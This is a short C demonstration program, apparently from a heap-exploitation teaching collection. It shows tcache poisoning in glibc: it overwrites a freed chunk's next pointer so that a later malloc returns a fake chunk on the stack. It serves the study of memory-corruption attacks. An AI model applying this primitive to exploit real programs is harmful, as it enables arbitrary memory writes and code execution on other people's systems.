#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>

typedef struct tcache_entry
{
    struct tcache_entry *next;
} tcache_entry;

struct malloc_chunk {
	size_t prev_size;
	size_t size;
	struct {
		struct malloc_chunk *fd;
		union {
			struct malloc_chunk *bk;
			char buf[100];
		};
	};
};

#define mem2chunk(m) \
	( (struct malloc_chunk*)((char*)m - offsetof(struct malloc_chunk, fd)) )
#define chunk2mem(c) \
	( (void*)((char*)c + offsetof(struct malloc_chunk, fd)) )

#define size2request(sz) (sz - 2*sizeof(size_t))
int main(void)
{
	printf("Corrupt next of tcache_entry, it's simialr to fastbin attack but no size check corresponding to fastbin index need to be satisfied.\n\n");
	size_t whatever_sz = 0xdeadbeef;
	struct malloc_chunk evil = {.size = whatever_sz, .buf = "hack!"};
	printf("Evil : %p\n", &evil);
	
	void *victim = malloc(0x20);
	free(victim);
	// overwrite victim's next pointer
	((tcache_entry*)victim)->next = (void*)&evil;
	printf("1st allocation : %p\n", malloc(0x20));
	struct malloc_chunk *m = malloc(0x20);
	printf("2nd allocation : %p, content = %s\n", m, m->buf);
	return 0;
}
